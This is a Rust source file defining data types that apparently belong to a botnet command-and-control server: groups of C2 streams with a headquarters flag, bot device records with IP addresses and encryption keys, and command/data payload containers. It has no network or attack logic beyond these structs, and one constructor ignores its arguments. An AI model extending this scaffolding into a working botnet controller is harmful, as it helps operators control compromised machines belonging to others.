extern crate core;
use crate::communication::lib;

use tokio::{
    net::{TcpListener, TcpStream},
};
use std::{
    net::SocketAddr,
};
use serde::{Deserialize, Serialize};
use rmp_serde::{Deserializer, Serializer};
use deepsize::DeepSizeOf;

#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf)]
pub struct Cohort {
    pub c2_id: Vec<u8>,
    pub is_hq: bool,
    pub C2_Stream: Vec<self::Device_stream>,
}
impl Cohort {
    pub fn new() -> Cohort {
        Cohort {
            c2_id: lib::generate_uid(),
            is_hq: false,
            C2_Stream: Vec::new(),
        }
    }
    pub fn append_C2_Stream(&mut self, C2_Stream: self::Device_stream) {
        self.C2_Stream.push(C2_Stream);
    }
    pub fn promote_to_hq(&mut self) {
        self.is_hq = true;
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf, Hash)]
pub struct Device_stream {
    pub ip_address: String,
    pub authenticated: bool,
    pub connected: bool,
    pub encryption_key: Vec<u8>,
    pub c2_id: Vec<u8>,
    pub B: self::Bot,
}
impl Device_stream {
    pub fn new (
        address: String,
        authenticated: bool,
        connected: bool,
        encryption_key: Vec<u8>,
        B: Bot,
    ) -> Device_stream {
        Device_stream {
            ip_address: address,
            authenticated: false,
            connected: true,
            encryption_key: vec![],
            c2_id: lib::generate_uid(),
            B: B,
        }
    }
    pub fn erase_data(&mut self) {
        //self.sock.shutdown(Shutdown::Both).unwrap();
        self.B.erase_data();
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf, Hash)]
pub struct Bot {
    #[serde(with = "serde_bytes")]
    pub uid: Vec<u8>,
    #[serde(with = "serde_bytes")]
    pub version: Vec<u8>,
    pub com: self::Commands
}
impl Bot {
    pub fn new(uid: Vec<u8>, version: Vec<u8>) -> Bot {
        Bot {
            uid: uid,
            version: version,
            com: Commands::new(Vec::new(), Vec::new())
        }
    }
    pub fn erase_data(&mut self) {
        self.com.erase_data();
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf, Hash)]
pub struct Commands {
    #[serde(with = "serde_bytes")]
    pub command: Vec<u8>,
    #[serde(with = "serde_bytes")]
    pub data: Vec<u8>,
}
impl Commands {
    pub fn new(command: Vec<u8>, data: Vec<u8>) -> Commands {
        Commands {
            command: command,
            data: data,
        }
    }
    pub fn erase_data(&mut self) {
        self.command.clear();
        self.data.clear();
    }
}
